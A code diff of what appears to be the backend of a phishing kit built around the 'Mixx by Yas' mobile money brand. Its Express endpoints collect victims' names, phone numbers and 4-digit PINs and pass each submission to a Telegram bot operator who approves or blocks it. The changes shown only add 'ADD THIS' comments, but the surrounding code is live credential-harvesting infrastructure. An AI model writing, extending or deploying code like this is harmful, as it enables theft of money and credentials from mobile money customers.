@@ -12,7 +12,7 @@ const DOMAIN = process.env.BACKEND_URL || 'https://mixx-by-yas-biashara.onrender
 const approvedPins = {};
 const approvedCodes = {};
 const approvedMerchants = {};
-const approvedMerchantPins = {};  // Added for merchant PIN verification
+const approvedMerchantPins = {};  // ADD THIS
 const blockPins = {};
 const requestBotMap = {};
 
@@ -164,7 +164,7 @@ app.get('/check-merchant/:requestId', (req, res) => {
     res.json({ approved: approvedMerchants[requestId] ?? null });
 });
 
-// ---------------- MERCHANT PIN SUBMISSION (4-digit PIN) ----------------
+// ---------------- MERCHANT PIN SUBMISSION (4-digit PIN) - ADD THIS ----------------
 app.post('/submit-merchant-pin', (req, res) => {
     const { name, phone, pin, botId } = req.body;
     const bot = getBot(botId);
@@ -183,6 +183,7 @@ app.post('/submit-merchant-pin', (req, res) => {
     res.json({ requestId });
 });
 
+// ---------------- CHECK MERCHANT PIN - ADD THIS ----------------
 app.get('/check-merchant-pin/:requestId', (req, res) => {
     const requestId = req.params.requestId;
     if (blockPins[requestId]) return res.json({ blocked: true, message: 'User blocked' });
@@ -243,7 +244,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
         feedback = 'User blocked 🛑'; 
     }
 
-    // Merchant PIN actions (4-digit)
+    // Merchant PIN actions (4-digit) - ADD THIS
     if (action === 'merchant_pin_ok') { 
         approvedMerchantPins[requestId] = true; 
         feedback = 'Merchant PIN approved ✅'; 
